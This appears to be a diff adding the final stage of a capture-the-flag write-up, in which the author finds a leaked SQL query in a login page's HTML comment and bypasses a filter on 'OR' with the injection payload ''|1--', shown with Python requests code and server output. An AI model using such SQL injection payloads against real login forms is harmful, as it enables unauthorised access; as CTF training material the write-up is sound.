@@ -72,3 +72,67 @@ MCTF3{Th3Truth_Mak3_U@Suffer}
 </table></form>
 ```
 > - Cool our 2nd flag ! __MCTF3{Th3Truth_Mak3_U@Suffer}__ :D
+
+
+# Matrix 3 ( Final Adventure ) :
+- Cool, we have now a USER & PASSWORD inputs here :D!
+- Lets post some data !
+> name=__username__ - name=__password__ and finally button for submission : __submit__.
+```
+query = {"username":"admin","password":"test","Type":"submit"} ## our query to post data ;)
+rr = requests.post(url, headers=head2 , data=query)
+print(rr.text)
+```
+
+```
+ # C:\>Python Matrix.py
+ ================================= Result ====================================
+<body bgcolor=#001B33><center><pre><font size=4 color=#2CAC0C face=monospace>
+Welcome to zion here is the Nebuchadnezzar 
+MCTF3{Th3Truth_Mak3_U@Suffer}
+ here you gonna start your training
+<img src="./nb.jpeg" height=250>
+<form method=post action=''><table>
+<tr><td><font color="#125523" size=4>USER</td><td><input type=text name=username></td></tr>
+<tr><td><font color="#125523" size=4>PASSWORD</td><td><input type=text name=password></td></tr>
+<tr><td></td><td><input type=submit value='LOGIN'></td></tr>
+<h2><font color=red>Wrong Password !</font></h2>
+</table></form>
+<!--<?php
+SELECT * from ninja where nname='admin' AND npass='098F6BCD4621D373CADE4E832627B4F6';--!>
+```
+> Hummm __Wrong Password__
+> * We have an SQL Query *_* !
+- Let's try to bypass it using the OR : __admin' or 1=1;---__
+> No way, the "OR" is rejected lol , i also tried OorR , it appears but nothing happens lol :S
+> I took 2 Hours, and finally i found it :]
+- You need to use __|__ instead of __OR__
+- My Payload was __'|1--__ and it means ---> __(select * from ninja where nname='' or 1--) ---> (select * from ninja where nname='' or True--)__
+> - we used __--__ for __comments__ to ignore the password part :)
+```
+query = {"username":"'|1--","password":"test","Type":"submit"}
+rr = requests.post(url, headers=head2 , data=query)
+print(rr.text)
+```
+```
+<body bgcolor=#001B33><center><pre><font size=4 color=#2CAC0C face=monospace>
+Welcome to zion here is the Nebuchadnezzar 
+MCTF3{Th3Truth_Mak3_U@Suffer}
+ here you gonna start your training
+<img src="./nb.jpeg" height=250>
+<form method=post action=''><table>
+<tr><td><font color="#125523" size=4>USER</td><td><input type=text name=username></td></tr>
+<tr><td><font color="#125523" size=4>PASSWORD</td><td><input type=text name=password></td></tr>
+<tr><td></td><td><input type=submit value='LOGIN'></td></tr>
+</table></form>
+<!--<?php
+SELECT * from ninja where nname=''|1--' AND npass='cfab1ba8c67c7c838db98d666f02a132';--!>
+Welcome MCTF{Sqli_IzALwaysTHEk3y$}
+</center></pre>
+```
+- Nice one :D final flag : __Welcome MCTF{Sqli_IzALwaysTHEk3y$}__
+
+
+### it was a great adventure guys !  Thanks to NEO :D ###
+
+> Greetz to all my dudes : Th3 Jackers , Ghosty , Aymen , Omar , Sudo_Root .... & All <3 
